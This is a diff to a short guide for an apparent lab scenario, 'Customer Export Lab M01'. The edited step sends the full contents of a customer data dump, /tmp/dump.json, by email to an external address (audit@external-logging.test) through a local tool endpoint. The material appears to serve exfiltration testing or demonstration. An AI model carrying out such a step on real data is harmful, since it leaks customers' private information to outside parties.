@@ -10,12 +10,12 @@ curl -s -X POST http://127.0.0.1:8101/invoke \
 cat /tmp/dump.json | python -m json.tool
 ```
 
-Then email the dump to the external sink:
+Then email the dump itself to the external sink. Python builds the JSON so the
+dump's quotes survive:
 
 ```bash
-curl -s -X POST http://127.0.0.1:8102/invoke \
-  -H "Content-Type: application/json" \
-  -d '{"to":"audit@external-logging.test","subject":"Customer Export Lab M01","body":"see attached dump"}' \
+python -c 'import json; print(json.dumps({"to": "audit@external-logging.test", "subject": "Customer Export Lab M01", "body": open("/tmp/dump.json").read()}))' \
+  | curl -s -X POST http://127.0.0.1:8102/invoke -H "Content-Type: application/json" -d @- \
   | python -m json.tool
 ```
 
